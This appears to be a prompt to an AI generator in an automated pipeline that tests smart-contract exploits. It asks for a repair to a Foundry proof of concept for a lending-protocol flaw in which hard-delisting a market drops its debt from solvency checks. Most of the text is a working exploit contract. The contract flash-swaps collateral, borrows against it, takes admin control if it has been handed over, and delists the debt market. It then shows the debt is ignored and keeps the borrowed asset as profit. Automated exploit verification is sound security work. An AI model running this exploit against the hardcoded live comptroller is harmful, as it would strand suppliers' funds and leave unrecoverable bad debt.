You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Hard-delisting a live market removes its debt from solvency checks and bricks normal resolution flows
- claim: `_delistMarket(bToken, true)` deletes `markets[bToken]` without setting `isMarketDelisted[bToken]`. After that, `isMarketListedOrDelisted(bToken)` becomes false, so `getHypotheticalAccountLiquidityInternal` skips the asset entirely, while `redeemAllowed`, `repayBorrowAllowed`, `liquidateBorrowAllowed`, and `seizeAllowed` all reject the market as unlisted.
- impact: Outstanding borrows in the hard-delisted market stop counting in account-liquidity checks, so a borrower can withdraw collateral or open fresh borrows elsewhere despite still owing the delisted debt. At the same time, suppliers and liquidators lose the normal redeem/repay/liquidate/seize paths for that market, turning live positions into trapped funds and unrecoverable bad debt.
- exploit_paths: ["Admin/guardian first set collateral factor to zero and pause mint/borrow/flashloan, then admin calls `_delistMarket(bToken, true)` while borrows or deposits still exist.", "A borrower with debt in that market interacts with another listed market; `getHypotheticalAccountLiquidityInternal` skips the hard-delisted debt and overstates solvency.", "Any normal attempt to redeem, repay, liquidate, or seize against the hard-delisted market reverts with `market not listed`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address bToken) external view returns (uint256);
}

interface IComptrollerLike {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function guardian() external view returns (address);
    function oracle() external view returns (address);
    function getAllMarkets() external view returns (address[] memory);
    function isMarketListed(address bToken) external view returns (bool);
    function isMarketDelisted(address bToken) external view returns (bool);
    function isMarketListedOrDelisted(address bToken) external view returns (bool);
    function mintGuardianPaused(address bToken) external view returns (bool);
    function borrowGuardianPaused(address bToken) external view returns (bool);
    function flashloanGuardianPaused(address bToken) external view returns (bool);
    function borrowCaps(address bToken) external view returns (uint256);
    function markets(address bToken) external view returns (bool, uint256, uint8);
    function enterMarkets(address[] calldata bTokens) external returns (uint256[] memory);
    function getHypotheticalAccountLiquidity(
        address account,
        address bTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) external view returns (uint256, uint256, uint256);
    function redeemAllowed(address bToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function repayBorrowAllowed(address bToken, address payer, address borrower, uint256 repayAmount) external returns (uint256);
    function liquidateBorrowAllowed(address bTokenBorrowed, address bTokenCollateral, address liquidator, address borrower, uint256 repayAmount) external returns (uint256);
    function seizeAllowed(address bTokenCollateral, address bTokenBorrowed, address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);
    function _acceptAdmin() external returns (uint256);
    function _setCollateralFactor(address bToken, uint256 newCollateralFactorMantissa) external returns (uint256);
    function _setMintPaused(address bToken, bool state) external returns (bool);
    function _setBorrowPaused(address bToken, bool state) external returns (bool);
    function _setFlashloanPaused(address bToken, bool state) external returns (bool);
    function _delistMarket(address bToken, bool force) external;
}

interface IBTokenLike {
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function underlying() external view returns (address);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant BPS_DENOMINATOR = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_950;
    uint256 internal constant FLASH_RESERVE_SLICE_BPS = 20;

    enum Outcome {
        Uninitialized,
        InfeasibleNoAdminPrivilege,
        InfeasibleNoLiveMarket,
        InfeasibleNoOtherListedMarket,
        InfeasibleNoUsableUnderlying,
        InfeasibleNoVerifierCapital,
        DelistAttemptedButNoBorrowerPath,
        HypothesisValidatedNoProfit,
        ProfitAchieved
    }

    struct MarketView {
        address bToken;
        address underlying;
        uint256 totalBorrows;
        uint256 totalSupply;
        uint256 cash;
        uint256 price;
        uint256 collateralFactorMantissa;
        uint256 borrowCap;
        uint8 decimals;
        bool listed;
        bool mintPaused;
        bool borrowPaused;
        bool flashloanPaused;
    }

    struct Candidate {
        MarketView debtMarket;
        MarketView collateralMarket;
        address pair;
        address factory;
        bool collateralIsToken0;
        uint256 flashCollateralAmount;
        uint256 quotedFeeDebtAmount;
        uint256 quotedBorrowAmount;
    }

    Outcome public outcome;
    address public selectedDelistMarket;
    address public selectedOtherMarket;
    address public selectedUnderlying;
    address public overrideProfitToken;
    uint256 public overrideProfitAmount;

    string public pathStage;
    string public failureReason;

    constructor() {
        outcome = Outcome.Uninitialized;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return overrideProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return overrideProfitAmount;
    }

    function executeOnOpportunity() external {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);

        pathStage = "prepare_admin_handoff";
        delete failureReason;
        selectedDelistMarket = address(0);
        selectedOtherMarket = address(0);
        selectedUnderlying = address(0);
        overrideProfitToken = address(0);
        overrideProfitAmount = 0;

        _acceptPendingAdminIfPossible(comptroller);
        if (comptroller.admin() != address(this)) {
            outcome = Outcome.InfeasibleNoAdminPrivilege;
            failureReason = "hard-delist path is admin-gated and no pending-admin handoff exists for the verifier on this fork";
            return;
        }

        pathStage = "scan_markets_and_pairs";
        Candidate memory candidate = _findBestCandidate(comptroller);
        if (candidate.debtMarket.bToken == address(0)) {
            if (bytes(failureReason).length == 0) {
                failureReason = "no listed collateral/debt pair can satisfy the hard-delist path on this fork";
            }
            outcome = Outcome.InfeasibleNoOtherListedMarket;
            return;
        }

        selectedDelistMarket = candidate.debtMarket.bToken;
        selectedOtherMarket = candidate.collateralMarket.bToken;
        selectedUnderlying = candidate.collateralMarket.underlying;
        overrideProfitToken = candidate.debtMarket.underlying;

        uint256 balanceBefore = IERC20Like(candidate.debtMarket.underlying).balanceOf(address(this));

        pathStage = "flashswap_fund_borrower_leg";
        uint256 amount0Out = candidate.collateralIsToken0 ? candidate.flashCollateralAmount : 0;
        uint256 amount1Out = candidate.collateralIsToken0 ? 0 : candidate.flashCollateralAmount;

        IUniswapV2PairLike(candidate.pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(candidate)
        );

        uint256 balanceAfter = IERC20Like(candidate.debtMarket.underlying).balanceOf(address(this));
        overrideProfitAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

        if (overrideProfitAmount >= MIN_PROFIT) {
            outcome = Outcome.ProfitAchieved;
            failureReason = "";
        } else {
            outcome = Outcome.HypothesisValidatedNoProfit;
            failureReason = "hard-delist mechanics executed but realized profit stayed below the minimum threshold";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected flashswap sender");

        Candidate memory candidate = abi.decode(data, (Candidate));
        require(msg.sender == candidate.pair, "unexpected pair callback");

        uint256 collateralAmount = amount0 > 0 ? amount0 : amount1;
        require(collateralAmount == candidate.flashCollateralAmount, "unexpected collateral amount");

        IComptrollerLike comptroller = IComptrollerLike(TARGET);

        pathStage = "mint_collateral_and_borrow_delist_debt";

        require(
            IERC20Like(candidate.collateralMarket.underlying).approve(candidate.collateralMarket.bToken, type(uint256).max),
            "collateral approve failed"
        );
        require(IBTokenLike(candidate.collateralMarket.bToken).mint(collateralAmount) == 0, "collateral mint failed");

        address[] memory enterList = new address[](1);
        enterList[0] = candidate.collateralMarket.bToken;
        uint256[] memory enterResults = comptroller.enterMarkets(enterList);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter market failed");

        uint256 debtFeeAmount = _quoteDebtTokenFee(
            candidate.collateralMarket.underlying,
            candidate.debtMarket.underlying,
            candidate.flashCollateralAmount,
            candidate.collateralIsToken0
        );

        uint256 exactBorrowCapacity = _maxBorrowable(comptroller, candidate.debtMarket);
        uint256 borrowAmount = _mulDiv(exactBorrowCapacity, BORROW_SAFETY_BPS, BPS_DENOMINATOR);
        require(borrowAmount > debtFeeAmount + MIN_PROFIT, "borrow path does not clear flash fee plus minimum profit");
        require(IBTokenLike(candidate.debtMarket.bToken).borrow(borrowAmount) == 0, "borrow failed");

        pathStage = "admin_pause_and_hard_delist";

        require(comptroller._setCollateralFactor(candidate.debtMarket.bToken, 0) == 0, "set collateral factor failed");
        require(comptroller._setMintPaused(candidate.debtMarket.bToken, true), "pause mint failed");
        require(comptroller._setBorrowPaused(candidate.debtMarket.bToken, true), "pause borrow failed");
        require(comptroller._setFlashloanPaused(candidate.debtMarket.bToken, true), "pause flashloan failed");
        comptroller._delistMarket(candidate.debtMarket.bToken, true);

        require(!comptroller.isMarketListed(candidate.debtMarket.bToken), "market still listed");
        require(!comptroller.isMarketListedOrDelisted(candidate.debtMarket.bToken), "hard-delisted market still considered listed-or-delisted");
        require(!comptroller.isMarketDelisted(candidate.debtMarket.bToken), "hard-delist unexpectedly marked soft-delist flag");

        pathStage = "prove_skipped_debt_and_bricked_resolution";

        (, uint256 liquidityAfter, uint256 shortfallAfter) =
            comptroller.getHypotheticalAccountLiquidity(address(this), candidate.collateralMarket.bToken, 0, 0);
        require(shortfallAfter == 0 && liquidityAfter > 0, "delisted debt was not skipped from liquidity");

        _requireBrickedHooks(candidate.debtMarket.bToken, candidate.collateralMarket.bToken);

        pathStage = "redeem_collateral_and_repay_flashswap";

        // The collateral principal is returned in-kind; only the AMM fee component is paid
        // out of the borrowed delisted asset, preserving the original finding's causality.
        require(
            IBTokenLike(candidate.collateralMarket.bToken).redeemUnderlying(candidate.flashCollateralAmount) == 0,
            "collateral redeem failed"
        );

        require(
            IERC20Like(candidate.collateralMarket.underlying).transfer(candidate.pair, candidate.flashCollateralAmount),
            "principal repayment failed"
        );
        require(
            IERC20Like(candidate.debtMarket.underlying).transfer(candidate.pair, debtFeeAmount),
            "fee repayment failed"
        );
    }

    function inspectSelectedMarkets() external view returns (MarketView memory delistMarket, MarketView memory otherMarket) {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);
        if (selectedDelistMarket != address(0)) {
            delistMarket = _inspectMarket(comptroller, selectedDelistMarket);
        }
        if (selectedOtherMarket != address(0)) {
            otherMarket = _inspectMarket(comptroller, selectedOtherMarket);
        }
    }

    function _acceptPendingAdminIfPossible(IComptrollerLike comptroller) internal {
        if (comptroller.admin() == address(this)) {
            return;
        }

        if (comptroller.pendingAdmin() == address(this)) {
            uint256 err = comptroller._acceptAdmin();
            require(err == 0, "accept admin failed");
        }
    }

    function _findBestCandidate(IComptrollerLike comptroller) internal returns (Candidate memory best) {
        address[] memory markets = comptroller.getAllMarkets();
        if (markets.length == 0) {
            outcome = Outcome.InfeasibleNoLiveMarket;
            failureReason = "no listed markets at fork";
            return best;
        }

        uint256 bestNetBorrow;
        for (uint256 i = 0; i < markets.length; ++i) {
            MarketView memory debtMarket = _inspectMarket(comptroller, markets[i]);
            if (!_isUsableDebtMarket(debtMarket)) {
                continue;
            }

            for (uint256 j = 0; j < markets.length; ++j) {
                if (i == j) {
                    continue;
                }

                MarketView memory collateralMarket = _inspectMarket(comptroller, markets[j]);
                if (!_isUsableCollateralMarket(collateralMarket)) {
                    continue;
                }

                Candidate memory candidate = _candidateFromFactories(debtMarket, collateralMarket);
                if (candidate.pair == address(0)) {
                    continue;
                }

                if (candidate.quotedBorrowAmount <= candidate.quotedFeeDebtAmount + MIN_PROFIT) {
                    continue;
                }

                uint256 netBorrow = candidate.quotedBorrowAmount - candidate.quotedFeeDebtAmount;
                if (netBorrow > bestNetBorrow) {
                    bestNetBorrow = netBorrow;
                    best = candidate;
                }
            }
        }

        if (best.pair == address(0) && bytes(failureReason).length == 0) {
            failureReason = "no paired listed markets with enough collateral value were found";
        }
    }

    function _candidateFromFactories(MarketView memory debtMarket, MarketView memory collateralMarket)
        internal
        view
        returns (Candidate memory best)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address factory = factories[i];
            address pair = IUniswapV2FactoryLike(factory).getPair(collateralMarket.underlying, debtMarket.underlying);
            if (pair == address(0)) {
                continue;
            }

            (bool collateralIsToken0, uint256 reserveCollateral, uint256 reserveDebt) =
                _pairReserves(pair, collateralMarket.underlying, debtMarket.underlying);
            if (reserveCollateral == 0 || reserveDebt == 0) {
                continue;
            }

            uint256 flashAmount = _mulDiv(reserveCollateral, FLASH_RESERVE_SLICE_BPS, BPS_DENOMINATOR);
            if (flashAmount == 0 || flashAmount >= reserveCollateral / 2) {
                continue;
            }

            uint256 quotedFeeDebtAmount = _quoteDebtFeeFromReserves(reserveCollateral, reserveDebt, flashAmount);
            uint256 quotedBorrowAmount = _quoteBorrowFromOracle(collateralMarket, debtMarket, flashAmount);

            if (quotedBorrowAmount <= quotedFeeDebtAmount + MIN_PROFIT) {
                continue;
            }

            best = Candidate({
                debtMarket: debtMarket,
                collateralMarket: collateralMarket,
                pair: pair,
                factory: factory,
                collateralIsToken0: collateralIsToken0,
                flashCollateralAmount: flashAmount,
                quotedFeeDebtAmount: quotedFeeDebtAmount,
                quotedBorrowAmount: quotedBorrowAmount
            });
            return best;
        }
    }

    function _isUsableDebtMarket(MarketView memory market) internal pure returns (bool) {
        if (!market.listed || market.underlying == address(0)) {
            return false;
        }
        if (market.borrowPaused || market.cash == 0) {
            return false;
        }
        if (market.price == 0 || market.decimals < 15) {
            return false;
        }
        return market.totalBorrows > 0 || market.totalSupply > 0;
    }

    function _isUsableCollateralMarket(MarketView memory market) internal pure returns (bool) {
        if (!market.listed || market.underlying == address(0)) {
            return false;
        }
        if (market.mintPaused || market.price == 0) {
            return false;
        }
        return market.collateralFactorMantissa > 0;
    }

    function _maxBorrowable(IComptrollerLike comptroller, MarketView memory debtMarket) internal view returns (uint256) {
        uint256 hi = debtMarket.cash;
        if (debtMarket.borrowCap != 0 && debtMarket.borrowCap > debtMarket.totalBorrows) {
            uint256 capHeadroom = debtMarket.borrowCap - debtMarket.totalBorrows - 1;
            if (capHeadroom < hi) {
                hi = capHeadroom;
            }
        }

        uint256 lo;
        while (lo < hi) {
            uint256 mid = lo + (hi - lo + 1) / 2;
            (uint256 err, , uint256 shortfall) =
                comptroller.getHypotheticalAccountLiquidity(address(this), debtMarket.bToken, 0, mid);
            if (err == 0 && shortfall == 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo;
    }

    function _requireBrickedHooks(address debtBToken, address collateralBToken) internal {
        (bool okRedeem,) =
            TARGET.call(abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, debtBToken, address(this), 1));
        require(!okRedeem, "redeemAllowed unexpectedly succeeded");

        (bool okRepay,) = TARGET.call(
            abi.encodeWithSelector(IComptrollerLike.repayBorrowAllowed.selector, debtBToken, address(this), address(this), 1)
        );
        require(!okRepay, "repayBorrowAllowed unexpectedly succeeded");

        (bool okLiquidate,) = TARGET.call(
            abi.encodeWithSelector(
                IComptrollerLike.liquidateBorrowAllowed.selector,
                debtBToken,
                collateralBToken,
                address(this),
                address(this),
                1
            )
        );
        require(!okLiquidate, "liquidateBorrowAllowed unexpectedly succeeded");

        (bool okSeize,) = TARGET.call(
            abi.encodeWithSelector(
                IComptrollerLike.seizeAllowed.selector,
                collateralBToken,
                debtBToken,
                address(this),
                address(this),
                1
            )
        );
        require(!okSeize, "seizeAllowed unexpectedly succeeded");
    }

    function _inspectMarket(IComptrollerLike comptroller, address bToken) internal view returns (MarketView memory m) {
        m.bToken = bToken;
        m.listed = comptroller.isMarketListed(bToken);
        m.mintPaused = comptroller.mintGuardianPaused(bToken);
        m.borrowPaused = comptroller.borrowGuardianPaused(bToken);
        m.flashloanPaused = comptroller.flashloanGuardianPaused(bToken);
        m.borrowCap = comptroller.borrowCaps(bToken);

        (, uint256 collateralFactorMantissa,) = comptroller.markets(bToken);
        m.collateralFactorMantissa = collateralFactorMantissa;

        try IBTokenLike(bToken).totalBorrows() returns (uint256 value) {
            m.totalBorrows = value;
        } catch {}

        try IBTokenLike(bToken).totalSupply() returns (uint256 value) {
            m.totalSupply = value;
        } catch {}

        try IBTokenLike(bToken).getCash() returns (uint256 value) {
            m.cash = value;
        } catch {}

        try IBTokenLike(bToken).underlying() returns (address value) {
            m.underlying = value;
        } catch {}

        if (m.underlying != address(0)) {
            try IERC20Like(m.underlying).decimals() returns (uint8 value) {
                m.decimals = value;
            } catch {}
        }

        address oracle = comptroller.oracle();
        if (oracle != address(0)) {
            try IPriceOracleLike(oracle).getUnderlyingPrice(bToken) returns (uint256 value) {
                m.price = value;
            } catch {}
        }
    }

    function _pairReserves(address pair, address collateralToken, address debtToken)
        internal
        view
        returns (bool collateralIsToken0, uint256 reserveCollateral, uint256 reserveDebt)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (token0 == collateralToken && token1 == debtToken) ||
                (token0 == debtToken && token1 == collateralToken),
            "pair token mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        collateralIsToken0 = token0 == collateralToken;
        if (collateralIsToken0) {
            reserveCollateral = reserve0;
            reserveDebt = reserve1;
        } else {
            reserveCollateral = reserve1;
            reserveDebt = reserve0;
        }
    }

    function _quoteBorrowFromOracle(
        MarketView memory collateralMarket,
        MarketView memory debtMarket,
        uint256 collateralAmount
    ) internal pure returns (uint256) {
        if (collateralMarket.price == 0 || debtMarket.price == 0 || collateralMarket.collateralFactorMantissa == 0) {
            return 0;
        }

        uint256 collateralValue = _mulDiv(collateralAmount, collateralMarket.price, 1e18);
        collateralValue = _mulDiv(collateralValue, collateralMarket.collateralFactorMantissa, 1e18);
        return _mulDiv(collateralValue, 1e18, debtMarket.price);
    }

    function _quoteDebtTokenFee(
        address collateralToken,
        address debtToken,
        uint256 collateralAmount,
        bool collateralIsToken0
    ) internal view returns (uint256) {
        (bool stillCollateralIsToken0, uint256 reserveCollateral, uint256 reserveDebt) =
            _pairReserves(msg.sender, collateralToken, debtToken);
        require(stillCollateralIsToken0 == collateralIsToken0, "pair direction changed");
        return _quoteDebtFeeFromReserves(reserveCollateral, reserveDebt, collateralAmount);
    }

    function _quoteDebtFeeFromReserves(
        uint256 reserveCollateral,
        uint256 reserveDebt,
        uint256 collateralAmount
    ) internal pure returns (uint256) {
        uint256 denominatorBase = reserveCollateral * 1000;
        require(denominatorBase > collateralAmount * 3, "flash amount too large");

        uint256 numerator = reserveDebt * collateralAmount * 3000;
        uint256 denominator = 997 * (denominatorBase - collateralAmount * 3);
        return _ceilDiv(numerator, denominator);
    }

    function _mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        if (x == 0 || y == 0) {
            return 0;
        }
        return (x * y) / denominator;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _delistmarket(btoken, true), gethypotheticalaccountliquidityinternal, market not listed
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
